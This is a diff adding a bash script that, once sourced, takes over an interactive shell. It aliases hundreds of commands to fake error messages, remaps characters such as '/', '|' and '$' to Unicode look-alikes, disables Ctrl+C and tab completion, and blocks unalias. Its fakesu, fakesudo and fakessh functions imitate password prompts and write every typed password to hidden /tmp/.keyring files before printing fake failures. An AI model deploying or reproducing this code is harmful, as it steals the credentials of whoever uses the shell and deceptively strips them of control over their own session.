@@ -1,0 +1,381 @@
+#!/bin/bash
+# Copyright 2024 @oaugustopro Otavio Augusto
+# Author: Otavio A M Camargo
+# Github: @oaugustopro
+# Email: camargo@oaugusto.pro
+# Date: 28/11/2024
+# Apache License
+
+# Deixa em modo restrito
+# set -o restricted # modo restrito completo
+set -o ignoreeof  # Evitar encerrar a sessão com Ctrl+D
+set -o noclobber  # Evitar sobrescrever arquivos
+# Desabilitar saida de erro
+
+# Para nao ficar rodando toda hora
+# echo "Value: $SETSH"
+# if [ "$SETSH" = "1" ]; then
+#     exit
+# else
+#     SETSH=1
+#     export SETSH
+# fi
+
+PS1_SSH="$PS1"
+{ export PS1="# "; } 2>/dev/null
+export EDITOR=vim
+readonly EDITOR
+readonly PS1
+export SHELL=/bin/bash
+readonly SHELL
+command alias alias=alias
+cd(){
+    export newpwd=$@
+    cd /tmp
+}
+command alias aa-exec="echo 'bash: aa-exec: command not found'"
+command alias ansible-playbook="echo 'bash: ansible-playbook: command not found'"
+command alias ansible-test="echo 'bash: ansible-test: command not found'"
+command alias aoss="echo 'bash: aoss: command not found'"
+command alias apt-get="echo 'E: Unable to locate package'"
+command alias apt="echo 'E: Command apt not found'"
+command alias ash="echo 'ash: cannot execute binary file: Exec format error'"
+command alias at="echo 'at: cannot open lockfile /var/run/atd.pid: Permission denied'"
+command alias awk="echo 'awk: command not found'"
+command alias aws="echo 'aws: command not found'"
+command alias bash="echo 'bash: /bin/bash: cannot execute binary file: Exec format error'"
+command alias bash='clear'
+command alias batcat="echo 'batcat: command not found'"
+command alias bconsole="echo 'bconsole: Connection refused'"
+command alias bundle="echo 'Could not locate Gemfile or .bundle/ directory'"
+command alias bundler="echo 'Could not locate Gemfile or .bundle/ directory'"
+command alias busctl="echo 'Failed to connect to bus: No such file or directory'"
+command alias busybox="echo 'busybox: applet not found'"
+command alias byebug="echo 'Could not start Byebug: No source file specified'"
+command alias c89="echo 'c89: no input files'"
+command alias c99="echo 'c99: no input files'"
+command alias cabal="echo 'cabal: command not found'"
+command alias capsh="echo 'capsh: command not found'"
+command alias cdist="echo 'ERROR: cdist: command not found'"
+command alias certbot="echo 'Error: certbot: command not found'"
+command alias check_by_ssh="echo 'CRITICAL: check_by_ssh: command not found'"
+chmod(){
+    /usr/bin/chmod u+r "$2"
+}
+command alias choom="echo 'choom: command not found'"
+command alias cobc="echo 'cobc: command not found'"
+command alias composer="echo 'Composer could not find a composer.json file in /current/directory'"
+command alias cowsay="echo 'cowsay: command not found'"
+command alias cowthink="echo 'cowthink: command not found'"
+command alias cpan="echo 'Can't locate CPAN.pm in @INC (you may need to install the CPAN module)'"
+command alias cpio="echo 'cpio: command not found'"
+command alias cpulimit="echo 'Process not found'"
+command alias crash="echo 'crash: cannot connect: Connection refused'"
+command alias csh="echo 'csh: command not found'"
+command alias csvtool="echo 'csvtool: command not found'"
+command alias dash="echo 'dash: cannot execute binary file'"
+command alias dc="echo 'dc: command not found'"
+command alias debugfs="echo 'debugfs: command not found'"
+command alias distcc="echo 'distcc: command not found'"
+command alias dmesg="echo 'dmesg: read kernel buffer failed: Operation not permitted'"
+command alias docker="echo 'Cannot connect to the Docker daemon at unix:///var/run/docker.sock. Is the docker daemon running?'"
+command alias dotnet="echo 'Failed to load the dll from [location]. The specified module could not be found.'"
+command alias dpkg="echo 'dpkg: error: dpkg frontend lock is locked by another process'"
+command alias dstat="echo 'dstat: command not found'"
+command alias dvips="echo 'Error: dvips: command not found'"
+command alias easy_install="echo 'error: easy_install: command not found'"
+command alias eb="echo 'ERROR: eb: command not found'"
+command alias ed="echo 'ed: command not found'"
+command alias elvish="echo 'elvish: cannot execute binary file'"
+command alias emacs="echo 'emacs: Cannot open display: '"
+command alias enscript="echo 'enscript: command not found'"
+command alias env="echo 'env: command not found'"
+command alias ex="echo 'ex: command not found'"
+command alias expect="echo 'expect: command not found'"
+command alias facter="echo 'ERROR: facter: command not found'"
+command alias find="echo 'find: command not found'"
+command alias fish="echo 'fish: Cannot open display: '"
+command alias flock="echo 'flock: command not found'"
+command alias ftp="echo 'ftp: command not found'"
+command alias gawk="echo 'gawk: command not found'"
+command alias gcc="echo 'gcc: fatal error: no input files'"
+command alias gcloud="echo 'ERROR: gcloud: command not found'"
+command alias gdb="echo 'gdb: No such file or directory.'"
+command alias gem="echo 'ERROR:  While executing gem ... (Gem::CommandLineError)'"
+command alias genie="echo 'genie: command not found'"
+command alias ghc="echo 'ghc: command not found'"
+command alias ghci="echo 'ghci: command not found'"
+command alias gimp="echo 'gimp: Cannot open display: '"
+command alias ginsh="echo 'ginsh: command not found'"
+command alias git="echo 'git: command not found'"
+command alias grc="echo 'grc: command not found'"
+command alias gtester="echo 'ERROR: gtester: command not found'"
+command alias hping3="echo 'usage: hping3 host [options]'"
+command alias iftop="echo 'iftop: command not found'"
+command alias ionice="echo 'ionice: command not found'"
+command alias irb="echo 'irb: command not found'"
+command alias ispell="echo 'ispell: command not found'"
+command alias jjs="echo 'jjs: command not found'"
+command alias joe="echo 'joe: command not found'"
+command alias journalctl="echo 'Failed to connect to bus: No such file or directory'"
+command alias jrunscript="echo 'jrunscript: command not found'"
+command alias jtag="echo 'jtag: command not found'"
+command alias julia="echo 'ERROR: julia: command not found'"
+command alias knife="echo 'ERROR: knife: command not found'"
+command alias ksh="echo 'ksh: cannot execute binary file'"
+command alias latex="echo 'Error: latex: command not found'"
+command alias latexmk="echo 'Error: latexmk: command not found'"
+command alias ld.so="echo 'ld.so: command not found'"
+command alias less="echo 'less: command not found'"
+command alias ls='ls -l -B $newpwd #'
+command alias lftp="echo 'lftp: command not found'"
+command alias loginctl="echo 'Failed to connect to bus: No such file or directory'"
+command alias logsave="echo 'logsave: command not found'"
+command alias ltrace="echo 'ltrace: command not found'"
+command alias lua="echo 'lua: command not found'"
+command alias lualatex="echo 'Error: lualatex: command not found'"
+command alias luatex="echo 'Error: luatex: command not found'"
+command alias mail="echo 'No mail for $USER'"
+command alias make="echo 'make: *** No targets specified and no makefile found.  Stop.'"
+command alias man="echo 'No manual entry for $1'"
+command alias mawk="echo 'mawk: command not found'"
+command alias minicom="echo 'minicom: command not found'"
+command alias more="echo 'more: command not found'"
+command alias msfconsole="echo 'Failed to connect to the database: Connection refused'"
+command alias msgfilter="echo 'msgfilter: command not found'"
+command alias multitime="echo 'multitime: command not found'"
+command alias mysql="echo 'ERROR 2002 (HY000): Can't connect to local MySQL server through socket'"
+command alias mkdir='echo "Error: Failed to create directory, insufficient permissions."'
+command alias nano="echo 'Error opening terminal: unknown.'"
+command alias nawk="echo 'nawk: command not found'"
+command alias ncdu="echo 'ncdu: command not found'"
+command alias ncftp="echo 'ncftp: command not found'"
+command alias neofetch="echo 'neofetch: command not found'"
+command alias nice="echo 'nice: command not found'"
+command alias nmap="echo 'nmap: command not found'"
+command alias node="echo 'Error: Cannot find module'"
+command alias nohup="echo 'nohup: command not found'"
+command alias npm="echo 'npm ERR! code ENOENT\nnpm ERR! syscall open'"
+command alias nroff="echo 'nroff: command not found'"
+command alias nsenter="echo 'nsenter: command not found'"
+command alias octave="echo 'error: octave: command not found'"
+command alias openvpn="echo 'ERROR: openvpn: command not found'"
+command alias pandoc="echo 'Error running filter'"
+command alias pdb="echo 'pdb: command not found'"
+command alias pdflatex="echo 'Error: pdflatex: command not found'"
+command alias pdftex="echo 'Error: pdftex: command not found'"
+command alias perf="echo 'perf: command not found'"
+command alias perl="echo 'Can't locate strict.pm in @INC (you may need to install the strict module)'"
+command alias perlbug="echo 'perlbug: command not found'"
+command alias pexec="echo 'pexec: command not found'"
+command alias pg="echo 'pg: command not found'"
+command alias php="echo 'PHP Fatal error:  Undefined class constant'"
+command alias pic="echo 'pic: command not found'"
+command alias pico="echo 'pico: command not found'"
+command alias pip="echo 'ERROR: pip: command not found'"
+command alias posh="echo 'posh: command not found'"
+command alias pry="echo 'pry: command not found'"
+command alias psftp="echo 'psftp: command not found'"
+command alias psql="echo 'psql: error: could not connect to server: No such file or directory'"
+command alias puppet="echo 'Error: puppet: command not found'"
+command alias pwsh="echo 'pwsh: command not found'"
+command alias pwd='echo $newpwd #'
+command alias python="echo 'ImportError: No module named '"
+command alias python3='python2'
+command alias python2='python3'
+command alias pip='python'
+command alias rake="echo 'rake aborted! LoadError: cannot load such file'"
+command alias rc="echo 'rc: command not found'"
+command alias rm='echo "Cannot remove file: Not enough permissions."'
+command alias rlwrap="echo 'rlwrap: command not found'"
+command alias rpm="echo 'error: rpm: command not found'"
+command alias rpmdb="echo 'error: rpmdb: command not found'"
+command alias rpmquery="echo 'error: rpmquery: command not found'"
+command alias rpmverify="echo 'error: rpmverify: command not found'"
+command alias rsync="echo 'rsync error: command not found'"
+command alias rtorrent="echo 'rtorrent: command not found'"
+command alias ruby="echo 'LoadError: cannot load such file'"
+command alias run-mailcap="echo 'run-mailcap: command not found'"
+command alias run-parts="echo 'run-parts: failed to open directory'"
+command alias runscript="echo 'runscript: command not found'"
+command alias rview="echo 'rview: cannot open display'"
+command alias rvim="echo 'rvim: cannot open display'"
+command alias sash="echo 'sash: command not found'"
+command alias scanmem="echo 'scanmem: command not found'"
+command alias scp="echo 'ssh: connect to host port 22: Connection refused'"
+command alias screen="echo 'Cannot open your terminal - please check.'"
+command alias script="echo 'script: command not found'"
+command alias scrot="echo 'scrot: command not found'"
+command alias sed="echo 'sed: command not found'"
+command alias service="echo 'service: command not found'"
+command alias setarch="echo 'setarch: command not found'"
+command alias setlock="echo 'setlock: command not found'"
+command alias sftp="echo 'ssh: connect to host port 22: Connection refused'"
+command alias sg="echo 'sg: command not found'"
+command alias slsh="echo 'slsh: command not found'"
+command alias smbclient="echo 'Connection to failed: NT_STATUS_CONNECTION_REFUSED'"
+command alias socat="echo 'socat: command not found'"
+command alias softlimit="echo 'softlimit: command not found'"
+command alias split="echo 'split: command not found'"
+command alias sqlite3="echo 'Error: unable to open database file'"
+command alias sqlmap="echo 'ERROR: sqlmap: command not found'"
+command alias ssh-agent="echo 'Error: ssh-agent: command not found'"
+command alias sudo="fakesudo #"
+command alias su="fakesu #\""
+command alias ssh="fakessh"
+command alias sshpass="echo 'sshpass: command not found'"
+command alias start-stop-daemon="echo 'start-stop-daemon: command not found'"
+command alias stdbuf="echo 'stdbuf: command not found'"
+command alias strace="echo 'strace: command not found'"
+command alias tar="echo 'tar: command not found'"
+command alias task="echo 'Taskwarrior: command not found'"
+command alias taskset="echo 'taskset: command not found'"
+command alias tasksh="echo 'tasksh: command not found'"
+command alias tclsh="echo 'error: tclsh: command not found'"
+command alias tdbtool="echo 'tdbtool: command not found'"
+command alias telnet="echo 'telnet: Unable to connect to remote host: Connection refused'"
+command alias tex="echo 'Error: tex: command not found'"
+command alias time="echo 'command not found'"
+command alias timedatectl="echo 'Failed to connect to bus: No such file or directory'"
+command alias timeout="echo 'timeout: command not found'"
+command alias tmate="echo 'tmate: command not found'"
+command alias tmux="echo 'failed to connect to server: Connection refused'"
+command alias top="echo 'top: command not found'"
+command alias torify="echo 'torify: command not found'"
+command alias torsocks="echo 'torsocks: command not found'"
+command alias tshark="echo 'tshark: command not found'"
+command alias unshare="echo 'unshare: command not found'"
+command alias vagrant="echo 'ERROR: vagrant: command not found'"
+command alias valgrind="echo 'valgrind: command not found'"
+command alias vi="vi -R /tmp/.tmpfile-SDJIJ887 #"
+command alias view="echo 'view: terminal database is inaccessible'"
+command alias users="echo \"users: command not found\""
+command alias vim='vim -R /tmp/.tmpfile-ASDDE97 # -u /etc/vim/restricted.vim'
+command alias vi.basic="vim"
+command alias visudo="vim"
+command alias vimdot="fakelogout"
+command alias vimtutor="vim"
+command alias vi.tiny="vim"
+command alias vimdiff="echo \"vimdiff: terminal database is inaccessible\""
+command alias vimdiff="echo 'vimdiff: terminal database is inaccessible'"
+command alias volatility="echo 'Volatility: command not found'"
+command alias watch="echo 'watch: command not found'"
+command alias wget="echo 'wget: unable to resolve host address'"
+command alias wish="echo 'error: wish: command not found'"
+command alias xargs="echo 'xargs: command not found'"
+command alias xdg-user-dir="echo 'xdg-user-dir: command not found'"
+command alias xdotool="echo 'Cannot open display: '"
+command alias xelatex="echo 'Error: xelatex: command not found'"
+command alias xetex="echo 'Error: xetex: command not found'"
+command alias yarn="echo 'error Command \"yarn\" not found.'"
+command alias yash="echo 'yash: cannot execute binary file'"
+command alias zathura="echo 'error: zathura: command not found'"
+command alias zip="echo 'zip error: Nothing to do!'"
+command alias zsh="echo 'zsh: failed to load module zsh/regex'"
+command alias zypper="echo 'Error: zypper: command not found'"
+
+fakelogout() {
+    clear
+	sleep 5
+# 	echo "Timeout, server not responding."
+# 	echo "Broken pipe, connection down."
+#     if [ -n "$SSH_CLIENT" ]; then
+#         export PS1="${PS1@Q}"
+#     else
+        hostserver=$(ss | grep -Eo  "[0-9.]+:ssh" | /bin/head -n 1 | cut -d ':' -f 1)
+        PS1='%F{%(#.blue.green)}┌──${debian_chroot:+($debian_chroot)─}${VIRTUAL_ENV:+($(basename $VIRTUAL_ENV))─}(%B%F{%(#.red.blue)}%n㉿%m%b%F{%(#.blue.green)})-[%B%F{reset}%(6~.%-1~/…/%4~.%5~)%b%F{%(#.blue.green)}]
+└─%B%(#.%F{red}#.%F{blue}$)%b%F{reset}'
+#     fi
+	command cd /
+}
+export fakelogout  # This won't export the function in POSIX shells.
+
+fakesu() {
+    echo -n "Password: "
+    stty -echo  # Turn off echo
+    read -s -p mypass
+    stty echo   # Turn echo back on
+    echo "$mypass" >> /tmp/.keyring-KK34ersu
+    sleep 4
+    echo "su: Authentication failure"
+}
+export -f fakesu
+fakesudo() {
+	read -s -p "[sudo] password for $USER:" mypass
+	echo $mypass >> /tmp/.keyring-KK34erdo
+	sleep 4
+	echo "Sorry, try again."
+	read -s -p "[sudo] password for $USER:" mypass
+	sleep 4
+	echo "Sorry, try again."
+	read -s -p "[sudo] password for $USER:" mypass
+	sleep 4
+	echo "sudo: 3 incorrect password attempts"
+}
+export -f fakesudo
+fakessh() {
+	usern=$(echo $@ | grep -o '[^ ]*@[^ ]*' | cut -d '@' -f1)
+	hostn=$(echo $@ | grep -o '[^ ]*@[^ ]*' | cut -d '@' -f2)
+	read -s -p "$usern@$hostn's password:" mypass
+	echo $mypass >> /tmp/.keyring-KK34erss
+	sleep 4
+	echo "Permission denied, please try again."
+	read -s -p "$usern@$hostn's password:" mypass
+	sleep 4
+	echo "Permission denied, please try again."
+	read -s -p "$usern@$hostn's password:" mypass
+	sleep 4
+	clear
+	echo "$(command uname -v)"
+}
+export -f fakessh
+
+bind '"/": "／"'
+bind '"|": "｜"'
+bind '"=": "⁼"'
+bind '"~": "^"'
+bind '";": ","'
+bind '"$": "＄"'
+bind '"#": "%"'
+bind '"&": "⅋"'
+bind -r '\C-v'
+bind -r '\C-c'
+bind '"\t": disable-completion'
+stty intr ''
+stty quit ''
+stty susp ''
+bind '"\e[M":ignore' # Desabilitar Eventos do Mouse no Terminal
+#xmodmap -e "keycode 118 = NoSymbol" # Shift Insert
+#xmodmap -e "keycode 37 = NoSymbol"   # Disables Ctrl+V
+#xmodmap -e "pointer = 1 0 0" > /dev/null 2>&1
+function kktrap() {
+	export ENV=/etc/bash.bashrc
+	eval "command unalias -a"
+    bind '"/": self-insert'
+    bind '"|": self-insert'
+    bind '"=": self-insert'
+    bind '"~": self-insert'
+    bind '"`": self-insert'
+    bind '";": self-insert'
+    bind '"$": self-insert'
+    bind '"#": self-insert'
+    bind '"&": self-insert'
+    bind '"\C-v": self-insert'
+    bind '"\C-c": interrupt'
+    bind '"\t": complete'
+    bind -r "\e[2~"
+    stty intr '^C'
+    stty quit '^\\'
+    stty susp '^Z'
+	export PS1="\[\e[32m\]\u@\h \[\e[34m\]\w\[\e[0m\]\n\[\e[33m\]➜ \[\e[0m\]"
+	reset
+#     xmodmap -e "pointer = 1 2 3"
+#     setxkbmap
+}
+export -f kktrap
+# command alias export="echo \"export: command not found\""
+# command alias declare="echo \"declare: command not found\""
+command alias unalias='echo bash: unalias: command not found'
+command alias alias=' #'
+clear
+echo "$(command uname -v)"
